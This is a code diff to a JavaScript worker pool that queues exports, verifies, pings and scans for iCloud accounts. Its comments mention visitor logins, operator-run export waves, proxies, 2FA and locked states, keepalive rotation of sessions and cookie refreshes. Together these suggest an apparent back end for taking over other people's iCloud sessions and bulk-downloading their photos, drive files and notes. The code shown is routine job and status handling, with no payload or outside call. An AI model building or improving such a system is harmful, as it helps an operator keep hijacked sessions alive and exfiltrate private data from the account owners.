@@ -135,7 +135,7 @@ export class WorkerPool {
         const account = this.store.getAccount(job.accountId);
         if (account && account.status === "exporting") {
           this.store.updateAccount(account.id, {
-            status: account.trusted ? "connected" : "done",
+            status: this.sessionStatus(account),
             export: { ...(account.export ?? {}), phase: "done" },
           });
         }
@@ -417,7 +417,9 @@ export class WorkerPool {
     // a deploy must not kill a photos export that has already started.
     for (const account of list) {
       const active = this.store.activeJobForAccount(account.id, "export");
-      if (active && !active.payload?.wave) this.cancelExportJob(active);
+      if (active && !active.payload?.wave && !active.payload?.priority) {
+        this.cancelExportJob(active);
+      }
     }
     this.waveAccounts = new Map(list.map((account) => [account.id, account]));
     this.priorityDone = new Set();
@@ -432,6 +434,16 @@ export class WorkerPool {
     return this.waveStatus();
   }
 
+  /** Session status to restore when an export ends. */
+  sessionStatus(account) {
+    const previous = account?.export?.previousStatus;
+    if (previous === "done") return "done";
+    if (["dead", "twofa", "invalid", "locked"].includes(previous)) return previous;
+    // connected / exporting / error / queued: the export just ran on this
+    // session, so an old "error" must not stay red after a successful one.
+    return account?.trusted ? "connected" : "done";
+  }
+
   cancelExportJob(job) {
     if (!job) return;
     this.queue = this.queue.filter((id) => id !== job.id);
@@ -440,9 +452,14 @@ export class WorkerPool {
       worker.socket.emit("job:cancel", { jobId: job.id });
       this.release(job, job.workerId);
     }
-    this.store.updateJob(job.id, { status: "cancelled", error: "replaced by export wave" });
+    this.store.updateJob(job.id, { status: "cancelled", error: "cancelled" });
     const account = this.store.getAccount(job.accountId);
-    if (account) this.store.updateAccount(account.id, { status: "connected" });
+    if (account) {
+      this.store.updateAccount(account.id, {
+        status: this.sessionStatus(account),
+        export: { ...(account.export ?? {}), phase: "cancelled" },
+      });
+    }
   }
 
   waveStatus() {
@@ -574,7 +591,12 @@ export class WorkerPool {
   addAccountToWave(account) {
     if (!this.exportEligible(account)) return;
     if (!this.wave) {
-      this.startExportWaves();
+      // No cycle running: download this account only.  A visitor login must
+      // not start a global wave (it would cancel the operator's manual
+      // export and re-queue notes for everyone).
+      this.startExport(account.id, { mode: "missing" }).catch((error) =>
+        console.error("[wave] account", error.message)
+      );
       return;
     }
     this.waveAccounts.set(account.id, account);
@@ -595,10 +617,20 @@ export class WorkerPool {
     if (!account) throw new Error("account not found");
     const active = this.store.activeJobForAccount(accountId, "export");
     if (active) {
-      if (account.lastError && account.trusted) {
-        this.store.updateAccount(accountId, { lastError: "" });
+      // The operator asked for a different area (photos vs drive vs hidden).
+      // A manual export must replace the running one, but an automatic wave
+      // must never replace a manual export: only priority requests do.
+      if (priority && active.payload?.mode !== mode) {
+        this.cancelExportJob(active);
+      } else if (priority && active.status === "queued") {
+        this.enqueue(active.id, true);
+        return { account, job: active, reused: true, parentJobId };
+      } else {
+        if (account.lastError && account.trusted) {
+          this.store.updateAccount(accountId, { lastError: "" });
+        }
+        return { account, job: active, reused: true, parentJobId };
       }
-      return { account, job: active, reused: true, parentJobId };
     }
     const job = this.store.createJob({
       accountId,
@@ -608,7 +640,18 @@ export class WorkerPool {
     this.store.updateAccount(accountId, {
       status: "exporting",
       lastError: "",
-      export: { phase: "queued", wave: mode, area: "", done: 0, total: 0, bytes: 0 },
+      export: {
+        phase: "queued",
+        wave: mode,
+        area: "",
+        done: 0,
+        total: 0,
+        bytes: 0,
+        previousStatus:
+          account.status === "exporting"
+            ? account.export?.previousStatus ?? ""
+            : account.status,
+      },
     });
     this.ocrMarks.set(accountId, { done: 0, at: Date.now() });
     // A new account's notes should land before a 10 GB photo/drive export
@@ -617,6 +660,21 @@ export class WorkerPool {
     this.enqueue(job.id, priority || this.notesMissing(accountId));
     this.notify("export_start", { account, job, mode });
     return { account, job, reused: false, parentJobId };
+  }
+
+  async stopExport(accountId) {
+    const account = this.store.getAccount(accountId);
+    if (!account) throw new Error("account not found");
+    const active =
+      this.store.activeJobForAccount(accountId, "export") ??
+      this.store.activeJobForAccount(accountId, "import");
+    if (!active) return { account, cancelled: false };
+    // fillWave re-queues every account without an active job; mark this one
+    // done for the cycle or the stop is undone a minute later.
+    if (this.wave) this.wave.done.add(accountId);
+    this.cancelExportJob(active);
+    this.store.updateJob(active.id, { status: "cancelled", error: "stopped by operator" });
+    return { account: this.store.getAccount(accountId), cancelled: true };
   }
 
   async startPing(accountId) {
@@ -678,8 +736,8 @@ export class WorkerPool {
     return { account, job, reused: false };
   }
 
-  async startVerify(accountId) {
-    return this.startSideJob(accountId, "verify");
+  async startVerify(accountId, options = {}) {
+    return this.startSideJob(accountId, "verify", options);
   }
 
   async startScan(accountId) {
@@ -687,11 +745,16 @@ export class WorkerPool {
   }
 
   /** verify/scan share the queue and slots of their workload. */
-  async startSideJob(accountId, type) {
+  async startSideJob(accountId, type, { front = false } = {}) {
     const account = this.store.getAccount(accountId);
     if (!account) throw new Error("account not found");
     const active = this.store.activeJobForAccount(accountId, type);
-    if (active) return { account, job: active, reused: true };
+    if (active) {
+      // "Verify live" on an account that is already queued must move it to the
+      // front, or the click looks dead behind a long keepalive queue.
+      if (front && active.status === "queued") this.enqueue(active.id, true);
+      return { account, job: active, reused: true };
+    }
     if (this.queue.length >= config.worker.maxQueue) {
       throw new Error("the job queue is full; try again shortly");
     }
@@ -850,6 +913,7 @@ export class WorkerPool {
       status: "running",
       workerId: worker.socket.id,
       attempts: (job.attempts ?? 0) + 1,
+      startedAt: new Date().toISOString(),
       error: "",
     });
     if (job.type === "auth") {
@@ -911,7 +975,12 @@ export class WorkerPool {
   release(job, workerId) {
     const worker = this.workers.get(workerId);
     if (worker) {
-      const kind = ["export", "scan", "import"].includes(job.type) ? "export" : "auth";
+      const kind =
+        job.type === "scan"
+          ? "scan"
+          : ["export", "import"].includes(job.type)
+            ? "export"
+            : "auth";
       worker.slots[kind] = Math.min(worker.slots[kind] + 1, 100);
     }
     const timer = this.waitTimers.get(job.id);
@@ -1023,7 +1092,9 @@ export class WorkerPool {
       unlockUrl: locked ? String(payload.unlockUrl ?? "") : "",
     });
     this.emitJob(job, account, "auth:result", {
-      status: finalStatus,
+      // The event keeps the job contract ("ok"/"invalid"/"error"); the account
+      // record carries the session status (connected/twofa/...).
+      status,
       reason: locked ? "locked" : payload.reason ?? "",
       message: payload.message ?? "",
       unlockUrl: locked ? String(payload.unlockUrl ?? "") : "",
@@ -1058,7 +1129,15 @@ export class WorkerPool {
     const account = this.store.getAccount(job.accountId);
     if (!account) return;
     const identity = payload.identity ?? payload.account?.identity ?? {};
-    const counts = payload.counts ?? payload.account?.counts ?? {};
+    // A zero-seeded inventory must not wipe the live numbers the panel shows.
+    const incoming = payload.counts ?? payload.account?.counts ?? {};
+    const counts = { ...(account.counts ?? {}) };
+    for (const [key, value] of Object.entries(incoming)) {
+      const number = Number(value);
+      if (!Number.isFinite(number)) continue;
+      counts[key] =
+        key === "driveSkipped" ? number : Math.max(Number(counts[key]) || 0, number);
+    }
     const patch = { identity, counts };
     if (Object.keys(counts).length) patch.countsUpdatedAt = new Date().toISOString();
     if (payload.proxy) patch.proxy = { ...(account.proxy ?? {}), ...payload.proxy };
@@ -1149,7 +1228,7 @@ export class WorkerPool {
     const job = this.store.getJob(payload.jobId);
     if (!job || job.workerId !== socket.id) return;
     if (job.status === "cancelled") {
-      this.release(job, socket.id);
+      // cancelExportJob already released the slot and restored the status.
       return;
     }
     const account = this.store.getAccount(job.accountId);
@@ -1157,14 +1236,24 @@ export class WorkerPool {
     const totals = payload.totals ?? {};
     // Prefer the worker's snapshot; fall back to the export tree for an old
     // worker payload that predates exporter.collect_counts().
-    const counts = payload.counts ?? countsFromExport(account.email) ?? {};
+    const incoming = payload.counts ?? countsFromExport(account.email) ?? {};
+    // The export tree is pruned to S4, so a disk walk reports 0 for files
+    // that are still in iCloud.  Merge instead of replacing: a disk count may
+    // never lower a live number.  The 5-hour verify is what can lower it.
+    const counts = { ...(account.counts ?? {}) };
+    for (const [key, value] of Object.entries(incoming)) {
+      const number = Number(value);
+      if (!Number.isFinite(number)) continue;
+      if (key === "driveSkipped") {
+        counts[key] = number;
+        continue;
+      }
+      counts[key] = Math.max(Number(counts[key]) || 0, number);
+    }
     const previousDone = Number(account.export?.done) || 0;
     const added = Math.max(0, (Number(totals.done) || 0) - previousDone);
     const updated = this.store.updateAccount(account.id, {
-      status: "done",
-      // The login-time inventory is a live snapshot.  The export knows what
-      // is actually on disk, so its counts replace the old numbers (notes
-      // added after login were the visible bug).
+      status: this.sessionStatus(account),
       ...(Object.keys(counts).length
         ? { counts, countsUpdatedAt: new Date().toISOString() }
         : {}),
@@ -1207,10 +1296,15 @@ export class WorkerPool {
     if (!job || job.workerId !== socket.id) return;
     const account = this.store.getAccount(job.accountId);
     if (!account) return;
+    if (job.type === "export" && job.status === "cancelled") {
+      // cancelExportJob already released the slot; a late worker error must
+      // not resurrect the job or hand the worker a phantom slot.
+      return;
+    }
     this.store.updateJob(job.id, { status: "error", error: payload.error ?? "worker error" });
     if (job.type === "export") {
       this.store.updateAccount(account.id, {
-        status: "error",
+        status: this.sessionStatus(account),
         export: { ...(account.export ?? {}), phase: "error" },
         lastError: payload.error ?? "export failed",
       });
@@ -1242,10 +1336,6 @@ export class WorkerPool {
       });
     }
     this.notify("error", { account: this.store.getAccount(account.id), job, error: payload.error });
-    if (job.type === "export" && job.status === "cancelled") {
-      this.release(job, socket.id);
-      return;
-    }
     if (job.type === "export") this.onWaveJobDone(job);
     this.release(job, socket.id);
   }
@@ -1260,9 +1350,22 @@ export class WorkerPool {
     const counts = countsFromVerify({ counts: payload.counts });
     // A DS-only session authenticates but cannot read Drive: Apple still wants
     // the 2FA code. Reporting it as "connected" hid that, so it is twofa now.
-    const status = ok ? (limited ? "twofa" : "connected") : "dead";
+    // One proxy hiccup must not file a working account as dead: the keepalive
+    // loops skip dead accounts, so that is how a live session falls out of the
+    // rotation for good.
+    const transient = /(connection|proxy|timeout|disconnected|network)/i.test(
+      String(payload.error ?? "")
+    );
+    const status = ok
+      ? limited
+        ? "twofa"
+        : "connected"
+      : transient && account.status === "connected"
+        ? "connected"
+        : "dead";
     const updated = this.store.updateAccount(account.id, {
-      status,
+      // The ping refreshes the session; it must not erase an in-flight export.
+      status: ok && account.status === "exporting" ? "exporting" : status,
       // Never demote a trusted account from a health check: a worker payload
       // may omit the flag, and a dead session is still the account's trust
       // record (it is what makes a cookie refresh enough to recover it).
@@ -1309,11 +1412,17 @@ export class WorkerPool {
     if (!job || job.workerId !== socket.id) return;
     const account = this.store.getAccount(job.accountId);
     if (!account) return;
+    // The worker sends the full missing lists; only the counts are shown.
+    // Capping them keeps items.json (and every admin:account reply) small.
+    const missing = {};
+    for (const [area, list] of Object.entries(payload.missing ?? {})) {
+      missing[area] = Array.isArray(list) ? list.slice(0, 50) : list;
+    }
     const verify = {
       startedAt: job.createdAt ?? account.verify?.startedAt ?? new Date().toISOString(),
       finishedAt: new Date().toISOString(),
       areas: payload.areas ?? {},
-      missing: payload.missing ?? {},
+      missing,
     };
     // Refresh every visible count from what the live check just measured, so
     // "Counts" and "Live iCloud check" never disagree after a refresh.  The
@@ -1338,7 +1447,9 @@ export class WorkerPool {
         ? { badges: { newFilesUntil: badgeUntil(), newFiles: totalMissing } }
         : {}),
     });
-    this.store.updateJob(job.id, { status: "done" });
+    if (["running", "queued"].includes(job.status)) {
+      this.store.updateJob(job.id, { status: "done" });
+    }
     this.emitAccount(updated, "account:verify", verify);
     this.notify("verify", { account: updated, job, verify });
     this.release(job, socket.id);
@@ -1543,8 +1654,37 @@ export class WorkerPool {
    *
    * `enqueue` is optional: pump() calls it without, to avoid recursing. */
   sweep(enqueue = true) {
+    // A verify can hang on a live worker (a stalled proxy read, a 20k library).
+    // Without a deadline it keeps its verify slot forever, and because only a
+    // couple of verifies run at once, every later live check queues for days.
+    const RUNNING_DEADLINE_MS = {
+      verify: 6 * 3600_000,
+      scan: 6 * 3600_000,
+      export: 24 * 3600_000,
+    };
     for (const job of this.store.jobs.values()) {
       if (job.status !== "running" && job.status !== "twofa") continue;
+      const deadline = RUNNING_DEADLINE_MS[job.type] ?? 0;
+      const started = Date.parse(job.startedAt || job.createdAt || 0);
+      if (deadline && Number.isFinite(started) && Date.now() - started > deadline) {
+        const busy = this.workers.get(job.workerId);
+        busy?.socket.emit("job:cancel", { jobId: job.id });
+        this.store.updateJob(job.id, { status: "error", error: "timed out" });
+        const account = this.store.getAccount(job.accountId);
+        if (account && job.type === "verify") {
+          this.store.updateAccount(account.id, {
+            recheckPending: false,
+            lastError: "live check timed out",
+          });
+        } else if (account && job.type === "export") {
+          this.store.updateAccount(account.id, {
+            status: this.sessionStatus(account),
+            export: { ...(account.export ?? {}), phase: "error" },
+            lastError: "export timed out",
+          });
+        }
+        continue;
+      }
       if (job.workerId && this.workers.has(job.workerId)) continue;
       const account = this.store.getAccount(job.accountId);
       this.store.updateJob(job.id, {
